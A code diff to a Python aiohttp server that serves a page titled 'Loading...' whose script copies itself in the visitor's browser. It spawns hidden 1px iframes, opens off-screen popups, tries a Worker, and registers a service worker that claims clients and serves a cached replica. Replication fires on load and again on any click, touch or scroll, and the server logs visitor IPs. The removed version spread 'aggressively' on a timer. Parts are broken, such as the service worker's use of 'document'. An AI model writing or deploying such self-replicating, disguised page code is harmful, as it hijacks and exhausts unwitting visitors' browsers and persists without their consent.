@@ -1,135 +1,111 @@
 # main.py
 from aiohttp import web
-import json, asyncio
+import json
 from datetime import datetime
 
 html_template = """
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Network Node</title>
-    <script>
-    class Node {
-        constructor() {
-            this.logs = [];
-            this.children = new Set();
-            this.init();
-        }
-        
-        async init() {
-            this.log('Node initialized');
-            await this.multiReplicate();
-            this.setupStatus();
-            // Aggressive spreading
-            setInterval(() => this.multiReplicate(), 5000);
-        }
-        
-        async multiReplicate() {
-            // Create multiple replicas
-            for(let i = 0; i < 3; i++) {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.srcdoc = document.documentElement.outerHTML;
-                document.body.appendChild(iframe);
-                this.children.add(iframe);
-            }
-            
-            // Pop-up replication if allowed
-            try {
-                const popup = window.open('', '_blank');
-                if(popup) {
-                    popup.document.write(document.documentElement.outerHTML);
-                    this.children.add(popup);
-                }
-            } catch(e) {
-                console.log('Popup blocked');
-            }
-            
-            await this.notifyServer();
-        }
-        
-        async notifyServer() {
-            try {
-                await fetch('/ready', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        url: window.location.href,
-                        children: this.children.size
-                    })
-                });
-                this.log(`Replicated to ${this.children.size} nodes`);
-            } catch(e) {
-                this.log('Notification failed: ' + e.message);
-            }
-        }
-        
-        log(msg) {
-            this.logs.push({
-                time: new Date().toISOString(),
-                message: msg,
-                nodes: this.children.size
-            });
-            this.updateStatus();
-        }
-        
-        updateStatus() {
-            document.getElementById('status').innerHTML = `
-                <h3>Node Status</h3>
-                <p>Active Nodes: ${this.children.size}</p>
-                <p>Logs: ${this.logs.length}</p>
-                <p>Latest: ${this.logs[this.logs.length-1]?.message || 'None'}</p>
-            `;
+<head><title>Loading...</title></head>
+<body>
+<script>
+class ReplicationNode {
+    constructor() {
+        this.attempts = 0;
+        this.init();
+    }
+
+    async init() {
+        // Multiple replication strategies
+        this.createHiddenIframes();
+        this.createWorker();
+        this.attemptWindowOpen();
+        this.setupServiceWorker();
+    }
+
+    createHiddenIframes() {
+        // Create multiple hidden iframes
+        for(let i = 0; i < 5; i++) {
+            const frame = document.createElement('iframe');
+            frame.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0';
+            frame.srcdoc = document.documentElement.outerHTML;
+            document.body.appendChild(frame);
         }
     }
-    
-    new Node();
-    </script>
-</head>
-<body>
-    <div id="status"></div>
+
+    createWorker() {
+        // Web Worker replication
+        const blob = new Blob([document.documentElement.outerHTML], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
+        new Worker(url);
+    }
+
+    attemptWindowOpen() {
+        // Try various window opening strategies
+        const features = 'width=1,height=1,left=-9999,top=-9999';
+        window.open(location.href, '_blank', features);
+        document.body.click(); // Some browsers allow popups after user interaction
+    }
+
+    async setupServiceWorker() {
+        if ('serviceWorker' in navigator) {
+            try {
+                await navigator.serviceWorker.register('/sw.js');
+            } catch(e) {
+                console.log(e);
+            }
+        }
+    }
+}
+
+// Start replication on any user interaction
+['click', 'touchstart', 'scroll'].forEach(event => {
+    document.addEventListener(event, () => new ReplicationNode(), {once: true});
+});
+
+// Initial replication
+new ReplicationNode();
+</script>
 </body>
 </html>
 """
 
+service_worker = """
+self.addEventListener('install', event => {
+    self.skipWaiting();
+    // Cache the replication code
+    caches.open('replica-v1').then(cache => {
+        cache.put('/', new Response(document.documentElement.outerHTML));
+    });
+});
+
+self.addEventListener('activate', event => {
+    event.waitUntil(clients.claim());
+});
+
+self.addEventListener('fetch', event => {
+    // Serve cached replica
+    event.respondWith(
+        caches.match(event.request).then(response => response || fetch(event.request))
+    );
+});
+"""
+
 class Server:
     def __init__(self):
-        self.logs = []
-        self.nodes = set()
-        self.total_replicas = 0
+        self.replicas = set()
 
     async def handle(self, request):
-        self.log_access(request)
+        self.replicas.add(request.remote)
         return web.Response(text=html_template, content_type='text/html')
 
-    async def ready(self, request):
-        data = await request.json()
-        self.nodes.add(data['url'])
-        self.total_replicas += data.get('children', 0)
-        return web.json_response({
-            'nodes': len(self.nodes),
-            'total_replicas': self.total_replicas
-        })
-
-    async def get_stats(self, request):
-        return web.json_response({
-            'nodes': len(self.nodes),
-            'logs': len(self.logs),
-            'total_replicas': self.total_replicas
-        })
-
-    def log_access(self, request, type='visit'):
-        self.logs.append({
-            'time': datetime.utcnow().isoformat(),
-            'ip': request.remote,
-            'type': type
-        })
+    async def sw(self, request):
+        return web.Response(text=service_worker, content_type='application/javascript')
 
 app = web.Application()
 server = Server()
 app.router.add_get('/', server.handle)
-app.router.add_post('/ready', server.ready)
-app.router.add_get('/stats', server.get_stats)
+app.router.add_get('/sw.js', server.sw)
 
 if __name__ == '__main__':
     web.run_app(app, port=8080)
